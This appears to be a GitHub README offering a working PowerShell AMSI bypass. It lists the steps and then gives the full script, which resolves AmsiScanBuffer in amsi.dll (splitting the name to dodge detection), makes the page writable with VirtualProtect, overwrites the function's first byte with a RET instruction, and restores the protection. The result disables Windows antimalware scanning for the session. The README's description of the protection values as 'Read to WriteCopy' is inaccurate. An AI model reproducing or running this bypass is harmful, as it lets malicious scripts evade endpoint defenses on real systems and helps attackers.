# AmsiBypass
Bypass Amsi By Overwriting AmsiScanBuffer function

# This Script will do the following:
``` 
 1- Get the Address of the "AmsiScanBuffer" function
 2- Change the page protection from 0x20 to 0x40 (Read to WriteCopy)
 3- Write 0xC3 (Ret Insturction) to the beginning of the AmsiScanBuffer
 4- Change back the page protectin from 0x40 to 0x20
 ```
 ```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

$lib = [Kernel32]::LoadLibrary("amsi.dll")
$aScanBufferAddress = [Kernel32]::GetProcAddress($lib,"Amsi"+"ScanBuffer")
$var = 0
[Kernel32]::VirtualProtect($aScanBufferAddress,[uint32]3,0x40,[ref]$var)
$ret = [Byte[]] (0xC3)
$sizeofbuf = [uint32]1
[System.Runtime.InteropServices.Marshal]::Copy($ret,0,$aScanBufferAddress,$sizeofbuf)
[Kernel32]::VirtualProtect($aScanBufferAddress,[uint32]3,0x20,[ref]$var)
```
